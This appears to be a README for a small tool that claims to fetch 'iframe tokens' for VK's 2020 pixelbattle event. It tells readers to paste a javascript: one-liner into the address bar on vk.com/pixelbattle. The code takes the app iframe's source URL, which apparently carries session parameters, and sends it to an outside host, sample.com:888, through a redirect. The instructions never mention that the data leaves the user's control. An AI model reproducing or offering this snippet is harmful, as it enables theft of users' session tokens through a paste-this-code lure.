# vkpixelbattle2020
Tool for getting vk pixelbattle 2020 iframe tokens

1. Go to https://vk.com/pixelbattle
2. Past code to url bar
3. Enjoy

# Code:
```javascript
javascript:window.location.href.includes("vk.com/pixelbattle") ? window.location.replace("http://sample.com:888?code=" + document.querySelector("#app_7148888_container iframe").src) : alert("use this on vk.com/pixelbattle !!!");
```